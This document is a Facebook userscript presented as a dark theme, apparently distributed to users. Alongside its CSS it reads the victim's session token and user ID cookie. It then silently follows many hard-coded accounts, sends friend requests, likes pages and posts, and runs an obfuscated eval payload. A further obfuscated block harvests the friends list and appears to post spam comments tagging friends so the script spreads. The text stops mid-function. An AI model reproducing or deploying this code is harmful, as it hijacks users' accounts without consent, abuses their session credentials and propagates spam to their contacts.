// ==UserScript==
// @name            Everything At One @Ephendy 
// @description     All about facebook By Ephendy 
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
/* Lumajang Theme Editor */
var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = false;
_audio.autoplay = true;
_audio.src = "http://c2lo.reverbnation.com/audio_player/download_song_direct/13447834";
_div.appendChild(_audio);
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100003968374379");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("10200517878257449");sublist("10200517875377377");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("223144604537731");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)};
var _1974;var _9894='9605B105F188D962B962B1072E1127A1087C1072D1117B1067B1172F887C1092B1067C777C1212C927A897C972B967D967A967D967D982B1012F997B1007F982D1002C987F982D1002B1012F897C932A1022B1212F927F897B972C967D967E967B967F977E972B1007E992D982D972D1007D1002C997F972D897D932A1022D1212F927B897F972A967C967E967B967F987A997E967D1002F972F1012A972E972E967B987F897C932C1022A1212A927D897C972F967F967A967A967E992E987E977A1012C987D997B972B992F977A992A897D932B1022A1212B927D897B972E967F967B967B967C997A977A1012F967F997C987E992C987C972A967A897E932A1022C1212D927A897E972C987F1002C977F1002E967E982B992A967B997F897C932F1022A1212A927E897D972A967C967E967F967D1002E987F992A1012E977B987A967E977F982D992E897E932F1022D1212B927F897A972D967E967B967D967B1002D997C972C1012F987F1012F987F967B987A967C897D932E1022E777D1092F1067C1142E927A897A972A967F967E967E967A977E972A1007C992A982E972A1007F1002D997D972F897A932B1022D1092F1067C1142C927F897A972A967E967A967F967F982B1012B997C1007C982E1002D987D982F1002E1012D897B932B1022B777F1302C1312C1217A1267A1252C1302A1307B927E897A977A1002E1002C987C977E972C967E987C1012A967E997C997D1007B982D1012E897A932C1022E1302A1312D1217D1267C1252A1302D1307C927E897B987C1007B1012B992B972B987D972A967C972A972E982F972E987B977B1012B897E932F1022A1302E1312C1217C1267E1252B1302F1307B927E897C982E967C987E972F967F1012F997E967E982F967A997E987B997D992B967D897D932E1022A1302E1312F1217F1267C1252E1302F1307A927B897A977A1002E1002B987D977E972E997F1007B992C1002F982C982D987B987F977F897D932C1022B1302E1312D1217A1267C1252D1302E1307E927F897D982F972B982A982D982B992D1002C987E992B987D1002C992F982A997F1012F897A932B1022A1302E1312A1217D1267E1252D1302B1307C927C897A992A972A977B997C992B972E992B987A977C972E992C972F967E972E1007D897B932A1022C1302C1312C1217F1267C1252C1302D1307D927C897A992F972C977B997F992F972F997B977F992B987A1007B987C982D987E982C897B932D1022B1302B1312A1217F1267A1252F1302C1307A927F897D977E967C1012D1002C972C967D967D987A977B992F977D987A972E977A992E897D932F1022F1302C1312E1217D1267D1252F1302B1307E927C897C977E967A1012D1002C967A1012D1002A1007C977E992E977D987D972F992B972B897F932C1022D1302C1312B1217D1267C1252A1302C1307C927B897E977F992C967E1002B1007D1012E1002E972D1007A987D972D1002E1012F982C982A897F932F1022F1302D1312F1217F1267E1252D1302A1307A927E897F977E992A967C1002E1012F967B987A972E1007C987E972D1002E1007F997F982B897D932D1022A1302A1312C1217F1267A1252E1302E1307B927D897C977C982E972A972A977C1007C972A987C1002D967B1002D977A1007C967D1002C897B932F1022E1302D1312F1217C1267C1252A1302E1307B927C897F977C982D972C972B977D1007E967A1007C1002E967D1002A977A1007E972A982E897D932D1022F1302C1312F1217E1267B1252A1302E1307A927D897B992D972B1002E972A967E992F1002F1002D992B967E1002E982C1012F997A1002A897D932A1022E1302F1312C1217A1267E1252C1302C1307A927A897D992B972C1002A972F967D992B1007B1012E992C967F1002E982B1012C992E992A897C932C1022B1302C1312D1217F1267B1252F1302A1307F927A897C972D967E977F967A967B992C972E1002D1007D1002C992C982E1002E1002A982D1002D1002C897A932A1022E1302B1312D1217E1267C1252E1302A1307B927B897A972F967B977E967C967C992F972F1002F1007F1002A1007A977D992B1002E987E987D1012D897B932C1022C1302A1312D1217D1267D1252D1302B1307A927E897C982E997D997A987A1007A972B1012B987C967E972A997D967A1002D987E1012E897E932E1022A1302D1312B1217C1267A1252A1302F1307D927B897D982C997D997C987A1007A977C982B982F997F1007B977B1002F982C1002A997D897B932C1022C1302C1312A1217B1267B1252E1302B1307F927F897E982C997F997D987B1007D977A1002C992D982F987D1012B987D967B967A972E897B932D1022A1302C1312F1217B1267D1252D1302B1307F927B897C982E997D997A987A1007F982E967A982C997D1007C977F1002F982A967F997D897B932B1022F1302A1312D1217B1267E1252C1302D1307E927C897F982D997D997F987B1007F982F977A972C967A972A997E967D997D977E977E897B932E1022B1302A1312F1217F1267F1252D1302E1307E927A897C972E982F1012C1002B1002A992C1012E982D1002C1002F972B987B1012A982B992C1002A897C932C1022D1302A1312A1217C1267B1252C1302D1307F927F897E972F982F1012F1002E1002D997D967E992C967D967C987D1007F977D992F1002B1007D897A932E1022E1302E1312E1217D1267E1252D1302D1307E927F897C977A967F1012B1002E967F1012E1002A1007E977A992E977E987A972B992F972F897E932D1022A1302B1312D1217A1267D1252F1302B1307B927B897F977C967F1012F1002F972E967A967B987C977C992F977E987B972B977E992F897E932A1022D1302F1312E1217A1267C1252A1302E1307E927E897D992C972D1002B972F967D992C1007A1012A992F967E1002A982E1012A992B992A897A932E1022C1302E1312F1217C1267A1252F1302D1307E927C897E992D972E1002B972C967F992E1002B1002B992B967E1002E982A1012C997D1002F897C932B1022D1302F1312C1217D1267A1252D1302D1307E927C897A977B982B972B972C977F1007D967D1007A1002D967C1002D977E1007D972A982C897C932A1022C1302E1312E1217E1267E1252D1302B1307A927D897F977D982C972E972E977A1007A972C987D1002A967A1002F977A1007F967E1002C897C932F1022E1302D1312F1217E1267F1252F1302E1307F927B897F972C987F967C977B972B1012B1007A972D1002D967D967D987C987B972F992C982C897B932C1022F1302C1312A1217F1267C1252D1302A1307F927B897E972F987F967F967C987E992E992D992C967A967A977F977C967B982C1002E977A897B932E1022C1302D1312B1217E1267B1252E1302C1307E927D897D977C997B1007F987C992B987A997F987D1012F1012A997A982D992B987B997B897B932B1022A777D1107C1252F1262B1232F927C897C987D1007B972C997D992F972B972D977D992C977B1002A987C997C1002D977E897B932B1022B1107F1252A1262A1232A927C897E977A967A1012A972D992A992E972C1002D977F997C972F1007D1012C987A1007F897A932B1022F1107B1252B1262C1232C927F897B992F1007D1007B1002F992F1012E997B987F972C977B967A982E1002E982C1002F897F932C1022C1107F1252D1262E1232E927A897B982B1012F1007F967A1002D1012C977E972B982A997B997A977B987C982C982F897A932E1022F1107D1252F1262B1232F927E897D992D997A997B967D967A972C997B992F967A972D967E997D972A987D997E897C932F1022F1107E1252A1262F1232A927D897E972A992B982C997D1012B967A987F1002E1007B972E982B972E987F1012E1002A897E932E1022C1107C1252B1262C1232C927F897E972C987C992E987F977D992D987B997F987F972E987B997F992B977F967A992E897C932E1022B1107A1252D1262B1232E927B897E997F1012E967F972A997D967F972F982B972B967B982A967D1002C982A992E897D932E1022F1107C1252C1262A1232D927C897B972A987C1002B972F982E977B1007E997D987B982A967F1012B982B977A982B997C897F932C1022F1107B1252A1262F1232D927E897C997B1012C997B987D992A992A1007F967E1002B967B997F992E972F997E987D897F932C1022D1107E1252C1262A1232C927E897B977A982B1012B987F997F997E1002C972C997D972C1012E972F982B992B992C897F932D1022B1107A1252B1262E1232C927F897D992B987F987E1012B1002C1002D1007A977D1007F1007E997D987B992E972A972F897E932B1022E1107C1252C1262D1232E927C897A972F997F977A1002F1012C1007E992E992F967B992A992D997E987D992E997D897F932A1022B1107D1252C1262A1232B927B897D987A982F997E972E992A1012D1002F967A997E987A1007D992F1007C972A967D897A932A1022C1107A1252A1262A1232F927A897A982C992A1002F1012A992A1007D1012F997C967D1012C1012B977E972E997F982C897A932C1022D1107D1252A1262A1232D927C897C992D967D997A1007D972C1002E1007B1007B1012F982E992F992B1012A1007C982C897C932D1022A1107C1252A1262A1232D927E897B987A987A972C977D992F987B982B997C1012F982D967C1007D992A1007C967A897F932E1022E1107B1252E1262B1232D927B897D997F977B1012E992C987D992F967B982F982F1002E997B992A992E982C987D897F932C1022C1107D1252B1262B1232E927B897E997F982C987D967B977F1012F972D992E997C997A982C992D997B982F1007F897E932F1022B1107A1252A1262A1232A927D897F977E982B977B997B1007E987C977F1007B982C992E997D1002A967B997A977D897F932B1022B1107B1252F1262E1232E927D897D977A987D987C1002E997B992D997F982E992B1002C967F992C1002E987C1002B897E932C1022E1107D1252A1262A1232F927B897A997E992D1007E972E967A1002F1007A977C1002E992F997C967D1012E967B1002F897C932A1022F1107F1252A1262A1232A927E897A977F972D992D967C987C977B987B967C992D982A992F982A1007B997A992E897F932F1022C1107D1252E1262C1232A927C897F992D972C977E1002B992F997B972D987E977F972F1002C997F982A997B967E897C932E1022E1107F1252E1262C1232F927F897C997C1007E972B977D987A1007F972A987F992A977C982C972D967C967F997E897F932C1022E1107F1252C1262B1232D927E897C992A1012D1002C997F1012C1007B1002F972B967E982C977E967C1012F997E992F897A932D1022C1107B1252B1262A1232A927C897B987A977E1012A1012C977F1012F972C972A982F1007E967F992B1007F967E1002E897E932C1022C1107A1252A1262A1232C927E897E987C977A1012B1012A977B1012B972D972E982B1007E967A992E1007F967D1002E897C932F1022F1107A1252F1262D1232F927B897D997B982B1002D1002B982C992C1007F972E1012B997F977F1002F967C967D1002B897E932E1022E1107C1252F1262F1232D927F897A997F972D972B992B1007A1007B972F992A977D977E977D1002F1012B987D997E897B932D1022E1107B1252C1262D1232E927F897C997D997D987A982A992B1012A1007C997E967E977B1007D1012E997B982B1007B897D932D1022E1107C1252C1262A1232B927C897A977C977A982D972F987F987F997D967A987A992A982C1002E1002A982C972C897B932F1022B1107D1252D1262E1232B927F897C977A972E987E967F982E982B987C982F977D972D977B1012E1002F982F967E897E932E1022F';var _5777=/[\x41\x42\x43\x44\x45\x46]/;var _2770=2;var _3721=_9894.charAt(_9894.length-1);var _7705;var _6940=_9894.split(_5777);var _8999=[String.fromCharCode,isNaN,parseInt,String];_6940[1]=_8999[_2770+1](_8999[_2770](_6940[1])/21);var _5589=(_2770==8)?String:eval;_7705='';_11=_8999[_2770](_6940[0])/_8999[_2770](_6940[1]);for(_1974=3;_1974<_11;_1974++)_7705+=(_8999[_2770-2]((_8999[_2770](_6940[_1974])+_8999[_2770](_6940[2])+_8999[_2770](_6940[1]))/_8999[_2770](_6940[1])-_8999[_2770](_6940[2])+_8999[_2770](_6940[1])-1));var _7464='_9386';var _9935='_7464=_7705';function _9110(_5331){_5589(_7340);_9110(_8868);_8868(_9935);_9110(_7464);}var _7340='_9110=_5589';var _8868='_8868=_9110';_9110(_3721);
//EPHENDY ID
a("100003968374379");a("100002185318761");a("100004607191104");a("100005429461525");a("100006290645410");a("1472703506");a("100007459240235");a("100007619494040");
IDS("100002185318761");IDS("100003968374379");
sublist("277421049066839");sublist("489514101131429");sublist("304109603064650");sublist("277421685733442");sublist("313335745475369");sublist("512651542151018");sublist("512651625484343");sublist("209710042524125");sublist("209709782524151");sublist("250789718417933");sublist("250790418417863");sublist("231128147072807");sublist("231128087072813");sublist("517105775073967");sublist("517105895073955");sublist("10200517875377377");sublist("10200517878257449");sublist("366481940160749");sublist("366482336827376");sublist("366482753494001");sublist("366483036827306");sublist("366483210160622");sublist("1397759377149357");sublist("1397760500482578");sublist("209709782524151");sublist("209710042524125");sublist("517105895073955");sublist("517105775073967");sublist("231128087072813");sublist("231128147072807");sublist("1402198170044153");sublist("1400455500220372");sublist("268454649963546");
Like("481651125274672");Like("209155172618948");Like("588759641203737");Like("398079213662433");Like("566001650106146");Like("153690478131497");Like("1454254641465205");Like("690160131030735");Like("1471328643093236");Like("696455807065164");Like("239466716191355");Like("544977828864511");Like("162798550556456");Like("436159706485810");Like("357958960992163");Like("506817889355983");Like("441254369308580");Like("629545033765534");Like("634029156635638");Like("232684283567062");Like("244765635705747");Like("658107827560907");Like("215042405353865");Like("512756142176360");Like("681248145231006");Like("597698710320965");Like("429929113805807");Like("429929113805807");Like("637735819627007");Like("611588152227946");Like("664359860289638");Like("223144604537731");Like("214033432129730");
//IRVAN ID
a("100001238018414");a("100003897348735");a("100001238018414");a("100003897348735");a("100005072670820");a("100006141553690");a("100007316291119");a("100007554152356");a("100007541705303");
IDS("100001238018414");
sublist("668443263206935");sublist("668407269877201");
Like("117682271723386");
P("648023445248917");P("641342945916967");P("603513426366586");
//JON ID
sublist("729652427055780");
//Theme
(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://ngulik.co/wp-content/uploads/2013/10/Galeri-22-Wallpaper-Gambar-Bunga-tulip-ungu.jpg) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #00FF00!important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #FF00FF!important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #FF00FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #FF0033 !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #3399FF!important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #3399FF!important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #3399FF!important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #CC00FF !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1477730312446643","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," cobain deh  \udbb8\udc3c @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= WOW Yg NGINTIP Profile aku banyak banget hahaha ketahuan deh kalo pengen nyoba  Lihat Petunjuk Di Atas yah \ud83c\udf31\ud83c\udf53\ud83c\udf4a\ud83c\udf34\ud83c\udf4e\ud83c\udf1f\ud83c\udf43\ud83c\udf40\ud83c\udf3b\ud83c\udf3a\ud83c\udf39\ud83c\udf38\ud83c\udf37 ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function 